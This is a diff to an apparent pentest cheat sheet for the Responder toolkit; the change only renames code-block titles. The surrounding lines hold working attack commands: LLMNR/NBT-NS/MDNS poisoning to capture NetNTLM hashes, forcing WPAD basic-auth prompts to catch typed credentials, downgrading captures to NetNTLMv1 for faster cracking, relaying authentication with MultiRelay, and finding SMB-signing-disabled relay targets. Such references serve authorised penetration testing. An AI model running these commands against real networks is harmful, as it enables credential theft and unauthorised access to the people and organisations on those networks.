@@ -13,7 +13,7 @@ var interface = printf 'tun0\neth0\nwlan0\n' --- --query tun0 --header "Select i
 
 Start Responder with poisoning enabled. Captures NetNTLM hashes from clients that fall back to broadcast resolution.
 
-```sh title:"Poison LLMNR/NBT-NS/MDNS, capture NetNTLM hashes"
+```sh title:"Responder Poison LLMNR/NBT-NS/MDNS, capture NetNTLM hashes"
 sudo responder -I $interface
 ```
 <!-- cheat
@@ -46,7 +46,7 @@ import interface
 
 Force HTTP basic-auth dialog when WPAD challenges - sometimes catches users who type creds into a browser popup.
 
-```sh title:"Force HTTP basic auth - sometimes catches typed creds"
+```sh title:"Responder Force HTTP basic auth - sometimes catches typed creds"
 sudo responder -I $interface --wpad -b
 ```
 <!-- cheat
@@ -57,7 +57,7 @@ import interface
 
 Coerce captured auth to NetNTLMv1 instead of v2 - v1 cracks dramatically faster on weak passwords or via Crack.sh.
 
-```sh title:"Downgrade captures to NetNTLMv1 (fast crack via Crack.sh)"
+```sh title:"Responder Downgrade captures to NetNTLMv1 (fast crack via Crack.sh)"
 sudo responder -I $interface --lm
 ```
 <!-- cheat
@@ -101,7 +101,7 @@ var challenge = printf '%s\n' '1122334455667788' --- --header 'Challenge'
 
 Run MultiRelay against a target, filtering for specific accounts (requires SMB+HTTP off in Responder.conf so the ports are free).
 
-```sh title:"MultiRelay to single target, only specified accounts"
+```sh title:"Responder MultiRelay to single target, only specified accounts"
 MultiRelay.py -t $rhost_ip -u $user1 $user2
 ```
 <!-- cheat
@@ -114,7 +114,7 @@ var user2
 
 Same MultiRelay but accept any successfully relayed account.
 
-```sh title:"MultiRelay any successfully relayed user"
+```sh title:"Responder MultiRelay any successfully relayed user"
 MultiRelay.py -t $rhost_ip -u ALL
 ```
 <!-- cheat
@@ -125,7 +125,7 @@ import domain_ip
 
 Check whether targets enforce SMB signing - signing-disabled hosts are valid relay targets.
 
-```sh title:"Find SMB-signing-disabled hosts (relay targets)"
+```sh title:"Responder Find SMB-signing-disabled hosts (relay targets)"
 RunFinger.py -i $cidr
 ```
 <!-- cheat
